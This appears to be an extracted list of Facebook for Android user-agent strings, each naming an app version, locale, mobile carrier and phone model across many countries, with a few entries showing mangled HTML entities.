"[FBAN/FB4A;FBAV/338.1.0.36.118;FBBV/321391444;FBDM/{density=2.8125,width=1080,height=2190};FBLC/en_US;FBRV/322565626;FBCR/Telekom.mk;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G998B;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/338.1.0.36.118;FBBV/321391463;FBDM/{density=2.625,width=1080,height=2198};FBLC/en_GB;FBRV/322599409;FBCR/A1 MK ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A705FN;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/338.1.0.36.118;FBBV/321391463;FBDM/{density=3.0,width=1080,height=2170};FBLC/en_US;FBRV/0;FBCR/Telekom MK;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A725F;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/338.1.0.36.118;FBBV/321391463;FBDM/{density=2.625,width=1080,height=2183};FBLC/mk_MK;FBRV/322634185;FBCR/A1 MK ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A715F;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/338.1.0.36.118;FBBV/321391463;FBDM/{density=2.625,width=1080,height=2131};FBLC/mk_MK;FBRV/322682479;FBCR/Telekom MK;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A505FN;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/338.1.0.36.118;FBBV/321391463;FBDM/{density=2.625,width=1080,height=2186};FBLC/en_US;FBRV/322751372;FBCR/Telekom.mk;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A515F;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/337.0.0.32.118;FBBV/319570999;FBDM/{density=2.625,width=1080,height=2094};FBLC/en_GB;FBRV/321223419;FBCR/Vip MK;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A750FN;FBSV/9;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/334.0.0.32.119;FBBV/314823108;FBDM/{density=3.0,width=1080,height=1776};FBLC/hr_HR;FBRV/316515843;FBCR/;FBMF/OnePlus;FBBD/OnePlus;FBPN/com.facebook.katana;FBDV/ONE A2003;FBSV/6.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/338.1.0.36.118;FBBV/321391444;FBDM/{density=2.8125,width=1080,height=2177};FBLC/mk_MK;FBRV/322141886;FBCR/A1 MK ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A528B;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/338.1.0.36.118;FBBV/321391463;FBDM/{density=2.625,width=1080,height=2186};FBLC/cs_CZ;FBRV/322823059;FBCR/Vodafone CZ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G780G;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/335.0.0.28.118;FBBV/316527983;FBDM/{density=4.0,width=1440,height=2560};FBLC/en_GB;FBRV/0;FBCR/Verizon ;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/XT1254;FBSV/6.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/338.1.0.36.118;FBBV/321391310;FBDM/{density=2.625,width=1080,height=2131};FBLC/cs_CZ;FBRV/322801866;FBCR/T-Mobile CZ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A505FN;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/338.1.0.36.118;FBBV/321391463;FBDM/{density=2.625,width=1080,height=2195};FBLC/cs_CZ;FBRV/322849253;FBCR/O2.CZ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A325F;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/335.0.0.28.118;FBPN/com.facebook.katana;FBLC/ru_RU;FBBV/316527966;FBCR/Bezlimit;FBMF/Xiaomi;FBBD/Redmi;FBDV/Redmi Note 8 Pro;FBSV/11;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.75,width=1080,height=2220};FB_FW/1;FBRV/317757053;]",
"[FBAN/FB4A;FBAV/338.1.0.36.118;FBBV/321391463;FBDM/{density=2.625,width=1080,height=2186};FBLC/cs_CZ;FBRV/323725482;FBCR/O2.CZ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A515F;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/339.0.0.32.118;FBBV/323007073;FBDM/{density=3.375,width=1080,height=2130};FBLC/pt_PT;FBRV/324113571;FBCR/MEO;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 7;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/340.0.0.27.113;FBBV/324485344;FBDM/{density=2.25,width=720,height=1353};FBLC/pt_BR;FBRV/326625752;FBCR/TIM 44;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A015M;FBSV/11;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/315.0.0.47.113;FBBV/285966672;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBRV/0;FBCR/airtel;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 5A;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/342.0.0.37.119;FBBV/328226385;FBDM/{density=1.875,width=720,height=1465};FBLC/en_US;FBRV/329767844;FBCR/VIRGIN;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A326W;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/342.0.0.37.119;FBBV/328226367;FBDM/{density=3.0,width=1080,height=2116};FBLC/en_Qaau_GB;FBRV/329906044;FBCR/MY MAXIS;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH1823;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/342.0.0.37.119;FBBV/328226390;FBDM/{density=1.75,width=720,height=1466};FBLC/es_LA;FBRV/330179575;FBCR/TELCEL;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/moto g(20);FBSV/11;FBBK/1;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/344.0.0.34.116;FBBV/331704276;FBDM/{density=2.0,width=720,height=1456};FBLC/ru_RU;FBRV/0;FBCR/MTS RUS;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH1931;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957701;FBDM/{density=3.5,width=1440,height=2792};FBLC/en_US;FBRV/333640481;FBCR/zain IQ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N950F;FBSV/9;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/344.0.0.34.116;FBBV/331704273;FBDM/{density=1.875,width=720,height=1458};FBLC/en_US;FBRV/332666248;FBCR/Verizon ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A426U;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957732;FBDM/{density=3.0,width=1080,height=2181};FBLC/zh_HK;FBRV/334074629;FBCR/1O1O;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G9960;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/324.0.0.48.120;FBBV/300480883;FBDM/{density=2.0,width=720,height=1280};FBLC/mr_IN;FBRV/0;FBCR/CellOne;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH1801;FBSV/7.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957728;FBDM/{density=2.8125,width=1080,height=2208};FBLC/zh_HK;FBRV/334042395;FBCR/csl.;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A226B;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957732;FBDM/{density=3.0,width=1080,height=2182};FBLC/en_US;FBRV/334543833;FBCR/&amp;#160-;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G988U1;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957732;FBDM/{density=3.0,width=1080,height=2110};FBLC/en_US;FBRV/334917327;FBCR/BITE&#17-LV;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A405FN;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957732;FBDM/{density=3.0,width=1080,height=2158};FBLC/he_IL;FBRV/334133301;FBCR/we;FBMF/realme;FBBD/realme;FBPN/com.facebook.katana;FBDV/RMX2170;FBSV/11;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957732;FBDM/{density=3.0,width=1080,height=2037};FBLC/zh_HK;FBRV/334483389;FBCR/SmarTone HK;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/CLT-L29;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957731;FBDM/{density=1.875,width=720,height=1465};FBLC/en_US;FBRV/333865872;FBCR/Boost Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A125U;FBSV/11;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957732;FBDM/{density=3.0,width=1080,height=2147};FBLC/zh_HK;FBRV/334678840;FBCR/3;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/VOG-L29;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957732;FBDM/{density=2.625,width=1080,height=2047};FBLC/zh_HK;FBRV/334042395;FBCR/CMHK;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G9750;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957731;FBDM/{density=1.75,width=720,height=1448};FBLC/zh_HK;FBRV/333817417;FBCR/3;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A217F;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957683;FBDM/{density=1.5,width=540,height=937};FBLC/es_LA;FBRV/334698665;FBCR/ ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-S260DL;FBSV/9;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957733;FBDM/{density=2.625,width=1080,height=2147};FBLC/en_US;FBRV/333880032;FBCR/Verizon;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LM-V405;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957731;FBDM/{density=1.875,width=720,height=1465};FBLC/es_LA;FBRV/334569512;FBCR/AT&amp;amp-T;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A125U;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957732;FBDM/{density=3.0,width=1080,height=2178};FBLC/en_US;FBRV/334543833;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G981U;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957732;FBDM/{density=2.8125,width=1080,height=2177};FBLC/en_US;FBRV/334745201;FBCR/SmarTone HK;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G781U1;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957732;FBDM/{density=2.625,width=1080,height=2186};FBLC/zh_HK;FBRV/334678840;FBCR/CMHK;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A515F;FBSV/11;FBBK/1;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957728;FBDM/{density=3.375,width=1080,height=2145};FBLC/zh_HK;FBRV/334074629;FBCR/SmarTone HK;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/LYA-L29;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957731;FBDM/{density=1.875,width=720,height=1465};FBLC/fr_FR;FBRV/334698665;FBCR/Bell;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A125F;FBSV/11;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957732;FBDM/{density=3.0,width=1080,height=2076};FBLC/zh_HK;FBRV/334602555;FBCR/SmarTone HK;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A9200;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957732;FBDM/{density=2.75,width=1080,height=2210};FBLC/fr_FR;FBRV/334233242;FBCR/GOLAN T;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Mi 9T;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/343.0.0.37.117;FBBV/329937452;FBDM/{density=2.75,width=1080,height=2131};FBLC/he_IL;FBRV/332189930;FBCR/Partner;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 7;FBSV/9;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957694;FBDM/{density=3.375,width=1080,height=2128};FBLC/ru_RU;FBRV/335057661;FBCR/Vodafone;FBMF/HUAWEI;FBBD/HONOR;FBPN/com.facebook.katana;FBDV/COR-L29;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957732;FBDM/{density=3.0,width=1080,height=2190};FBLC/es_ES;FBRV/334932975;FBCR/Lebara;FBMF/HUAWEI;FBBD/HONOR;FBPN/com.facebook.katana;FBDV/COL-L29;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957652;FBDM/{density=2.625,width=2434,height=1096};FBLC/zh_HK;FBRV/334731776;FBCR/CTM;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/XQ-AT52;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957732;FBDM/{density=2.8125,width=1080,height=2191};FBLC/zh_HK;FBRV/334745201;FBCR/China Telecom;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G9880;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957376;FBDM/{density=3.0,width=1080,height=2310};FBLC/zh_HK;FBRV/333880032;FBCR/China Telecom;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/V1955A;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957690;FBDM/{density=3.0,width=1080,height=1800};FBLC/en_US;FBRV/334698665;FBCR/3 Macau;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/BAC-L22;FBSV/8.0.0;FBBK/1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957732;FBDM/{density=2.625,width=1080,height=2094};FBLC/en_US;FBRV/333732671;FBCR/Sprint;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N960U;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957690;FBDM/{density=3.0,width=1080,height=2016};FBLC/zh_TW;FBRV/0;FBCR/TW Mobile;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH1721;FBSV/7.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957687;FBDM/{density=2.0,width=720,height=1422};FBLC/uk_UA;FBRV/335217798;FBCR/KYIVSTAR;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/MRD-LX1;FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957732;FBDM/{density=2.8125,width=1080,height=2190};FBLC/he_IL;FBRV/335047760;FBCR/Cellcom;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G998B;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957732;FBDM/{density=2.625,width=1080,height=2186};FBLC/he_IL;FBRV/0;FBCR/Rami Levy;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A515F;FBSV/10;FBBK/1;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957732;FBDM/{density=2.75,width=1080,height=2138};FBLC/he_IL;FBRV/335019163;FBCR/Cellcom IL;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Mi Note 10 Lite;FBSV/11;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]",
"Mozilla/5.0 (Linux; Android 11; M2004J19C Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.45 Mobile Safari/537.36 [FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957732;FBDM/{density=2.75,width=1080,height=2134};FBLC/de_DE;FBRV/335126939;FB_FW/2;FBCR/Blau;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/M2004J19C;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957687;FBDM/{density=2.0,width=720,height=1280};FBLC/uk_UA;FBRV/335228559;FBCR/KYIVSTAR;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J530FM;FBSV/8.1.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957733;FBDM/{density=3.1875,width=1080,height=2159};FBLC/ru_RU;FBRV/335047760;FBCR/UA-KYIVSTAR;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A515F;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957371;FBDM/{density=3.375,width=1080,height=2128};FBLC/ru_RU;FBRV/335101947;FBCR/lifecell;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/SNE-LX1;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957732;FBDM/{density=2.8812501,width=1080,height=2134};FBLC/ru_RU;FBRV/335522282;FBCR/Vodafone UA;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 8 Pro;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957732;FBDM/{density=3.0,width=1080,height=2016};FBLC/ru_RU;FBRV/335550883;FBCR/Vodafone UA;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Mi A2;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957732;FBDM/{density=3.0,width=1080,height=2147};FBLC/sv_SE;FBRV/335539330;FBCR/3;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/VOG-L29;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957731;FBDM/{density=1.75,width=720,height=1423};FBLC/en_US;FBRV/335126939;FBCR/ ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-S205DL;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957732;FBDM/{density=2.625,width=1080,height=2189};FBLC/he_IL;FBRV/335462048;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N770F;FBSV/11;FBBK/1;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957732;FBDM/{density=3.0,width=1080,height=2183};FBLC/he_IL;FBRV/0;FBCR/Pelephone;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G985F;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957732;FBDM/{density=3.0,width=1080,height=2265};FBLC/ru_RU;FBRV/335688972;FBCR/Rami Levy;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/VOG-L29;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957733;FBDM/{density=3.375,width=1080,height=2146};FBLC/es_LA;FBRV/335522282;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N980F;FBSV/11;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]",
"Navegador [FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957718;FBDM/{density=1.75,width=720,height=1411};FBLC/es_LA;FBRV/335919869;FBCR/TELCEL;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A115M;FBSV/11;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957731;FBDM/{density=1.875,width=720,height=1465};FBLC/cs_CZ;FBRV/335950585;FBCR/SAZKAmobilCZ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A125F;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957728;FBDM/{density=2.8125,width=1080,height=2177};FBLC/cs_CZ;FBRV/335819109;FBCR/T-Mobile CZ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A528B;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957728;FBDM/{density=2.8125,width=1080,height=2192};FBLC/en_US;FBRV/334626402;FBCR/Verizon ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G986U;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957701;FBDM/{density=2.625,width=1080,height=2094};FBLC/he_IL;FBRV/336326830;FBCR/GOLAN T;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G950F;FBSV/9;FBBK/0;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/346.0.0.29.119;FBBV/335950338;FBDM/{density=2.75,width=1080,height=2134};FBLC/en_US;FBRV/336698666;FBCR/LMT;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/M2004J19C;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957732;FBDM/{density=3.375,width=1080,height=2002};FBLC/en_US;FBRV/335785728;FBCR/U.S. Cellular;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G970U;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
"FBAN/FB4A;FBAV/346.0.0.29.119;FBBV/335950283;FBDM/{density=2.0,width=720,height=1384};FBLC/es_LA;FBRV/0;FBCR/TELCEL;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J600G;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957728;FBDM/{density=2.8125,width=1080,height=2125};FBLC/en_US;FBRV/336326830;FBCR/Jio 4G;FBMF/OnePlus;FBBD/OnePlus;FBPN/com.facebook.katana;FBDV/GM1901;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/346.0.0.29.119;FBBV/335950328;FBDM/{density=3.0,width=1080,height=2164};FBLC/es_LA;FBRV/0;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N981U;FBSV/11;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/343.0.0.37.117;FBBV/329937466;FBDM/{density=2.625,width=1080,height=2186};FBLC/en_US;FBRV/332189930;FBCR/Sprint;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A515U;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957731;FBDM/{density=1.875,width=720,height=1465};FBLC/es_ES;FBRV/335539330;FBCR/TELCEL;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A125F;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957732;FBDM/{density=2.625,width=1080,height=2283};FBLC/en_US;FBRV/336326830;FBCR/Verizon ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G981V;FBSV/11;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957732;FBDM/{density=3.0,width=1080,height=2016};FBLC/en_US;FBRV/336326830;FBCR/Xfinity Mobile;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LM-Q720;FBSV/10;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/346.0.0.29.119;FBBV/335949376;FBDM/{density=2.0,width=720,height=1358};FBLC/en_Qaag_GB;FBRV/0;FBCR/MPT;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/ATU-L42;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/346.0.0.29.119;FBBV/335950318;FBDM/{density=2.0,width=720,height=1410};FBLC/en_US;FBRV/0;FBCR/Metro by T-Mobile;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LM-K500;FBSV/10;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957687;FBDM/{density=2.0,width=720,height=1344};FBLC/en_US;FBRV/336326830;FBCR/ ;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/moto e6 (XT2005DL);FBSV/9;FBBK/1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/347.0.0.28.237;FBBV/337279749;FBDM/{density=2.625,width=1080,height=2240};FBLC/en_US;FBRV/0;FBCR/T-Mobile ;FBMF/Google;FBBD/google;FBPN/com.facebook.katana;FBDV/Pixel 6;FBSV/12;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]",
